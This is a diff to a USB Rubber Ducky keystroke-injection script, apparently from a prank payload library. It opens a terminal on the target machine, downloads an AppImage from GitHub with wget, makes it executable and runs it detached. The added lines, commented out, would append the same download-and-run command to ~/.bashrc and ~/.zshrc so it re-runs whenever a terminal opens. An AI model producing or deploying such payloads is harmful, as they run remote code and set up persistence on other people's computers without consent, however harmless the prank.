@@ -15,3 +15,6 @@ CTRL-ALT t
 DELAY 1500
 STRING nohup wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Activate_linux/AL.AppImage && chmod +x AL.AppImage && ./AL.AppImage & disown && exit
 ENTER
+REM If you want this to pop up every time they open a terminal
+REM STRING echo "wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Activate_linux/AL.AppImage && chmod +x AL.AppImage && ./AL.AppImage & disown" >> ~/.zshrc && echo "wget https://github.com/FalsePhilosopher/BadUSB-Playground/raw/main/Ducky/USBRubberducky/library/prank/Unix-like/Linux/Activate_linux/AL.AppImage && chmod +x AL.AppImage && ./AL.AppImage & disown" >> ~/.bashrc && exit
+REM ENTER
